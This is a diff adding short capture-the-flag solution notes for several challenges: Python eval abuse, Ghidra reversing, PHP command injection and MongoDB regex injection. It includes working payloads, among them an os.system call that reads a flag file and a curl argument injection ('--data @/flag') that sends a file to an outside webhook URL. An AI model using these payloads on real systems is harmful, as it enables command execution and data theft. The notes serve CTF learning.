@@ -1,0 +1,9 @@
+misc -> Input as a Service --- python eval, telnet to the port and run __import__("os").system("cat /app/flag.txt") -- i ran os.getcwd() then os.listdir("/app") to figure out the file
+
+rev -> Authenticator -- use Ghidra - see that there is a static userid; then it does a compare. the compare is an XOR of a string with hex 09 - do this to get string th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3
+
+rev -> passphrase -> look at in ghidra; there is a hex per character, just get them in order (higher number to lower) and boom
+
+web -> Healthcheck -> look at files - see that the input ip is executed as a curl command. the index.php has a setting which prevents you from putting it in there, in console "host='127.0.0.1'" then execute the command from the main.js - capture in burp. Now you can call the command easily. See that the command is escaped, this means you can only run one command - looked up php escape shell cmd - https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#curl - for CURL you can include a file, change to ip=--data "@/flag" https://webhook.site/a94268da-dd25-47c3-b2bd-0d6bbcf011f4  -- we know the flag location b/c of the setup scripts
+
+web -> wild goose hunt -> look over code; see it's mongodb and nodejs; search found a known issue where you can use [regex] to try and match; solve.py in the folder is the brute forcer
